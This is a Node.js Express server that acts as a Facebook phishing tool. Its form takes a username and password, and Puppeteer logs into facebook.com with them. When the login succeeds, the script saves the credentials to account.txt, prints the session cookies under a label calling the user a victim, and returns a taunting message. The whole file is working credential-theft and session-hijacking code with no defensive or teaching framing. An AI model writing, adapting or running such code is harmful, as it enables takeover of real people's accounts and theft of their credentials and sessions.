const express = require('express');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer')
var fs = require('fs');
const app = express();
app.set('view engine', 'ejs');
app.set('views', './views');
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get('/', function (req, res) {
	res.render('home');
})

app.post('/', function (req, res) {
	var username = req.body.username; 
	var password = req.body.password;

	let autoLogin = async() => {
		console.log('Dang thuc hien dang nhap voi...');
		console.log('Username: ' + username);
		console.log('Password: *******');
	    const browser = await puppeteer.launch({
	        headless: true
	      })
	      const page = await browser.newPage()
	      await page.goto('https://www.facebook.com/login.php')

	      const USER_SELECTOR = '#email'
	      const PASSWORD_SELECTOR = '#pass'
	      const BUTTON_LOGIN_SELECTOR = '#loginbutton'

	    
	      await page.click(USER_SELECTOR)
	      await page.keyboard.type(username)

	      await page.click(PASSWORD_SELECTOR)
	      await page.keyboard.type(password)

	      await page.click(BUTTON_LOGIN_SELECTOR)

	      console.log('Dang dang nhap...')
	      await page.waitForNavigation()
	      var pageTitle = await page.title();

	      if (pageTitle == "Đăng nhập Facebook | Facebook") {
	      	console.log('Dang nhap that bai!')
	      	res.redirect(301, '/')
	      } else {
		  	fs.appendFile('account.txt', username + '|' + password + ', \n', function (err) {
			  if (err) throw err;
			  console.log('Saved!');
			});
			
	      	console.log('Dang nhap thanh cong!')
	      	console.log('Dang lay cookies...')
	      	const cookies = await page.cookies()
	      	console.log('-------------cookies cua nan nhan------------- ');

	      	cookies.forEach((cookie, i) => {

	      		console.log(cookie.name +'='+cookie.value + ';')

	      	})
	      	res.end('<h1>Dang nhap thanh cong! Ban da bi mat cookie ahihi!<h1>');
	      }



	}
	autoLogin()
})

app.listen(80);